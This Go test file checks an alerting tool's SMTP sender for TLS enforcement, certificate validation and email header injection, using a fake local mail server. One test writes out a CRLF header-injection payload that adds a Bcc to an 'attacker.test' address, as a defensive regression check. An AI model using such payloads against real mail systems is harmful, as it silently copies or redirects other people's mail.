// SPDX-License-Identifier: BUSL-1.1
//
// Use of this source code is governed by the Business Source License 1.1
// in the LICENSE file at the root of this repository; on its Change Date
// each version converts to the Mozilla Public License 2.0.

package alert

import (
	"bufio"
	"context"
	"crypto/tls"
	"crypto/x509"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/ctlplne/probectl/internal/crypto"
)

// fakeSMTP is a minimal SMTP server for exercising SMTPSender's TLS contract.
// It records every MAIL FROM and whether one ever arrived before the session
// was TLS-secured — the property the sender must make impossible.
type fakeSMTP struct {
	ln       net.Listener
	tlsCfg   *tls.Config // nil = STARTTLS never offered
	implicit bool

	mu                sync.Mutex
	mailFrom          []string
	rcpt              []string
	data              string
	plaintextMailFrom bool
}

func newFakeSMTP(t *testing.T, tlsCfg *tls.Config, implicit bool) *fakeSMTP {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	s := &fakeSMTP{ln: ln, tlsCfg: tlsCfg, implicit: implicit}
	go s.serve()
	t.Cleanup(func() { _ = ln.Close() })
	return s
}

func (s *fakeSMTP) addr() string { return s.ln.Addr().String() }

func (s *fakeSMTP) serve() {
	for {
		conn, err := s.ln.Accept()
		if err != nil {
			return
		}
		go s.session(conn)
	}
}

func (s *fakeSMTP) session(conn net.Conn) {
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	secured := false
	if s.implicit {
		tc := tls.Server(conn, s.tlsCfg)
		if err := tc.Handshake(); err != nil {
			return
		}
		conn = tc
		secured = true
	}
	w := func(line string) { _, _ = conn.Write([]byte(line + "\r\n")) }
	w("220 fake ESMTP")
	r := bufio.NewReader(conn)
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		cmd := strings.TrimSpace(line)
		upper := strings.ToUpper(cmd)
		switch {
		case strings.HasPrefix(upper, "EHLO"), strings.HasPrefix(upper, "HELO"):
			w("250-fake greets you")
			if s.tlsCfg != nil && !s.implicit && !secured {
				w("250-STARTTLS")
			}
			w("250 OK")
		case upper == "STARTTLS":
			if s.tlsCfg == nil || secured {
				w("454 not available")
				continue
			}
			w("220 go ahead")
			tc := tls.Server(conn, s.tlsCfg)
			if err := tc.Handshake(); err != nil {
				return
			}
			conn = tc
			secured = true
			w2 := func(line string) { _, _ = conn.Write([]byte(line + "\r\n")) }
			_ = w2
			r = bufio.NewReader(conn)
			w = func(line string) { _, _ = conn.Write([]byte(line + "\r\n")) }
		case strings.HasPrefix(upper, "MAIL FROM"):
			s.mu.Lock()
			s.mailFrom = append(s.mailFrom, cmd)
			if !secured {
				s.plaintextMailFrom = true
			}
			s.mu.Unlock()
			w("250 OK")
		case strings.HasPrefix(upper, "RCPT TO"):
			s.mu.Lock()
			s.rcpt = append(s.rcpt, cmd)
			s.mu.Unlock()
			w("250 OK")
		case upper == "DATA":
			w("354 end with .")
			var body strings.Builder
			for {
				dl, err := r.ReadString('\n')
				if err != nil {
					return
				}
				if strings.TrimRight(dl, "\r\n") == "." {
					break
				}
				body.WriteString(dl)
			}
			s.mu.Lock()
			s.data = body.String()
			s.mu.Unlock()
			w("250 OK queued")
		case upper == "QUIT":
			w("221 bye")
			return
		default:
			w("250 OK")
		}
	}
}

// serverTLS builds a CA-signed server TLS config for 127.0.0.1 plus a client
// base config trusting that CA — all through internal/crypto (§7 guardrail 3).
func serverTLS(t *testing.T, hosts []string) (server *tls.Config, clientBase *tls.Config) {
	t.Helper()
	ca, err := crypto.GenerateCA("smtp-test-ca", time.Hour)
	if err != nil {
		t.Fatal(err)
	}
	certPEM, keyPEM, err := ca.IssueServerCert("smtp-test", hosts, time.Hour)
	if err != nil {
		t.Fatal(err)
	}
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		t.Fatal(err)
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(ca.CertPEM()) {
		t.Fatal("append CA cert")
	}
	clientBase = crypto.HardenedClientTLSConfig()
	clientBase.RootCAs = pool
	return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, clientBase
}

func TestSMTPSenderRefusesServerWithoutSTARTTLS(t *testing.T) {
	srv := newFakeSMTP(t, nil, false) // plaintext-only server
	sender := NewSMTPSender(srv.addr(), "probectl@example.test", nil, SMTPStartTLS, nil)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	err := sender.Send(ctx, []string{"oncall@example.test"}, "s", "b")
	if err == nil || !strings.Contains(err.Error(), "STARTTLS") {
		t.Fatalf("plaintext-only server must be refused with a STARTTLS error, got %v", err)
	}
	srv.mu.Lock()
	defer srv.mu.Unlock()
	if len(srv.mailFrom) != 0 {
		t.Fatalf("sender issued MAIL FROM on an unsecured session: %v", srv.mailFrom)
	}
}

func TestSMTPSenderImplicitModeRefusesPlaintextServer(t *testing.T) {
	srv := newFakeSMTP(t, nil, false) // speaks plaintext; sender expects TLS-first
	sender := NewSMTPSender(srv.addr(), "probectl@example.test", nil, SMTPImplicitTLS, nil)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := sender.Send(ctx, []string{"oncall@example.test"}, "s", "b"); err == nil {
		t.Fatal("implicit-TLS sender accepted a plaintext server")
	}
}

func TestSMTPSenderValidatesServerCertificate(t *testing.T) {
	serverCfg, _ := serverTLS(t, []string{"other.example.test"}) // wrong name for 127.0.0.1
	srv := newFakeSMTP(t, serverCfg, false)
	_, clientBase := serverTLS(t, []string{"127.0.0.1"}) // trusts a DIFFERENT CA too
	sender := NewSMTPSender(srv.addr(), "probectl@example.test", nil, SMTPStartTLS, clientBase)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := sender.Send(ctx, []string{"oncall@example.test"}, "s", "b"); err == nil {
		t.Fatal("sender accepted a certificate that verifies under neither name nor CA")
	}
	srv.mu.Lock()
	defer srv.mu.Unlock()
	if len(srv.mailFrom) != 0 {
		t.Fatalf("sender proceeded past a failed certificate verification: %v", srv.mailFrom)
	}
}

func TestSMTPSenderDeliversOverSTARTTLS(t *testing.T) {
	serverCfg, clientBase := serverTLS(t, []string{"127.0.0.1"})
	srv := newFakeSMTP(t, serverCfg, false)
	sender := NewSMTPSender(srv.addr(), "probectl@example.test", nil, SMTPStartTLS, clientBase)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := sender.Send(ctx, []string{"oncall@example.test"}, "probectl alert", "rule fired"); err != nil {
		t.Fatalf("starttls delivery failed: %v", err)
	}
	srv.mu.Lock()
	defer srv.mu.Unlock()
	if srv.plaintextMailFrom {
		t.Fatal("MAIL FROM arrived before the session was TLS-secured")
	}
	if len(srv.mailFrom) != 1 || len(srv.rcpt) != 1 ||
		!strings.Contains(srv.data, "Subject: probectl alert") ||
		!strings.Contains(srv.data, "rule fired") {
		t.Fatalf("delivered message incomplete: from=%v rcpt=%v data=%q", srv.mailFrom, srv.rcpt, srv.data)
	}
}

func TestSMTPSenderDeliversOverImplicitTLS(t *testing.T) {
	serverCfg, clientBase := serverTLS(t, []string{"127.0.0.1"})
	srv := newFakeSMTP(t, serverCfg, true)
	sender := NewSMTPSender(srv.addr(), "probectl@example.test", nil, SMTPImplicitTLS, clientBase)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := sender.Send(ctx, []string{"oncall@example.test"}, "probectl alert", "rule fired"); err != nil {
		t.Fatalf("implicit-tls delivery failed: %v", err)
	}
	srv.mu.Lock()
	defer srv.mu.Unlock()
	if srv.plaintextMailFrom || len(srv.mailFrom) != 1 || !strings.Contains(srv.data, "rule fired") {
		t.Fatalf("implicit delivery incomplete: plaintext=%v from=%v data=%q", srv.plaintextMailFrom, srv.mailFrom, srv.data)
	}
}

// TestSMTPSenderRefusesHeaderInjection (DPR-243) is the CodeQL go/email-injection
// finding, reproduced and closed. A rule name is tenant-supplied free text — it
// arrives through the rule-create API and is stored verbatim — and EmailChannel
// builds the Subject from it. A header is CRLF-delimited, so a rule name carrying
// \r\n does not corrupt the Subject; it ENDS it, and the next line is whatever the
// author chose: Bcc to an address the operator never configured, a Reply-To that
// redirects the reply, or a blank line and a second body entirely.
//
// The oracle is the bytes the server received, not the error: delivery must still
// succeed (an alert must not be suppressible by naming a rule badly) while the
// message carries exactly the headers probectl wrote.
func TestSMTPSenderRefusesHeaderInjection(t *testing.T) {
	serverCfg, clientBase := serverTLS(t, []string{"127.0.0.1"})
	srv := newFakeSMTP(t, serverCfg, false)
	sender := NewSMTPSender(srv.addr(), "probectl@example.test", nil, SMTPStartTLS, clientBase)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// What an attacker would put in a rule name, reaching Subject via
	// EmailChannel.Notify's fmt.Sprintf.
	hostile := "disk full\r\nBcc: exfil@attacker.test\r\nReply-To: attacker@attacker.test\r\n\r\nInjected body"
	if err := sender.Send(ctx, []string{"oncall@example.test"}, "[probectl][critical] "+hostile+" firing", "b"); err != nil {
		t.Fatalf("delivery must still succeed — an alert cannot be suppressible by naming a rule badly: %v", err)
	}

	srv.mu.Lock()
	data := srv.data
	srv.mu.Unlock()
	if data == "" {
		t.Fatal("server recorded no message")
	}

	headers, _, _ := strings.Cut(data, "\r\n\r\n")

	// The oracle is STRUCTURAL, not a substring search. After sanitization the
	// text "Bcc:" still appears — inside the Subject's value, which is exactly
	// where it is harmless. What must not exist is a header LINE whose name is
	// Bcc, so parse the names and compare the set.
	var names []string
	for _, line := range strings.Split(headers, "\r\n") {
		if line == "" || strings.HasPrefix(line, " ") || strings.HasPrefix(line, "\t") {
			continue // a folded continuation of the previous header, not a new one
		}
		name, _, ok := strings.Cut(line, ":")
		if !ok {
			t.Errorf("header block contains a line that is not a header: %q", line)
			continue
		}
		names = append(names, name)
	}
	want := []string{"From", "To", "Subject", "MIME-Version", "Content-Type"}
	if len(names) != len(want) {
		t.Fatalf("message has %d header lines %v, want exactly %v — an extra line means an injected header:\n%s",
			len(names), names, want, headers)
	}
	for i := range want {
		if names[i] != want[i] {
			t.Errorf("header %d = %q, want %q (full headers:\n%s)", i, names[i], want[i], headers)
		}
	}
	// And the injected text is carried as Subject CONTENT, on one line.
	subjectLines := 0
	for _, line := range strings.Split(headers, "\r\n") {
		if strings.HasPrefix(line, "Subject:") {
			subjectLines++
			for _, forbidden := range []string{"\r", "\n"} {
				if strings.Contains(line, forbidden) {
					t.Errorf("Subject line still carries a raw control byte: %q", line)
				}
			}
		}
	}
	if subjectLines != 1 {
		t.Errorf("found %d Subject lines, want exactly 1:\n%s", subjectLines, headers)
	}
	// The text is still carried, just as one safe header value.
	if !strings.Contains(headers, "disk full") {
		t.Errorf("the rule name's real text was lost, not just made safe:\n%s", headers)
	}
}

// TestHeaderValueSanitization (DPR-243) pins the helper directly, including the
// cases the injection test cannot reach through Send.
func TestHeaderValueSanitization(t *testing.T) {
	for name, tc := range map[string]struct{ in, want string }{
		"plain":              {"disk usage high", "disk usage high"},
		"crlf":               {"a\r\nBcc: x@y.z", "a Bcc: x@y.z"},
		"lone lf":            {"a\nb", "a b"},
		"lone cr":            {"a\rb", "a b"},
		"tab":                {"a\tb", "a b"},
		"nul":                {"a\x00b", "a b"},
		"collapses runs":     {"a\r\n\r\n   \t b", "a b"},
		"trims":              {"  a  ", "a"},
		"keeps unicode":      {"disque plein é 磁盘", "disque plein é 磁盘"},
		"empty":              {"", ""},
		"only control chars": {"\r\n\t", ""},
	} {
		if got := headerValue(tc.in); got != tc.want {
			t.Errorf("%s: headerValue(%q) = %q, want %q", name, tc.in, got, tc.want)
		}
	}
	long := strings.Repeat("x", maxHeaderValue*2)
	if got := headerValue(long); len(got) > maxHeaderValue {
		t.Errorf("headerValue did not bound a %d-char value: got %d", len(long), len(got))
	}
	// A subject is sanitized AND encoded, so no raw control byte can survive and
	// a non-ASCII rule name still arrives intact.
	enc := encodedSubject("a\r\nBcc: x@y.z")
	if strings.ContainsAny(enc, "\r\n") {
		t.Errorf("encodedSubject kept a control byte: %q", enc)
	}
	if got := encodedSubject("磁盘已满"); !strings.HasPrefix(got, "=?utf-8?q?") {
		t.Errorf("encodedSubject(non-ASCII) = %q, want an RFC 2047 encoded-word", got)
	}
}
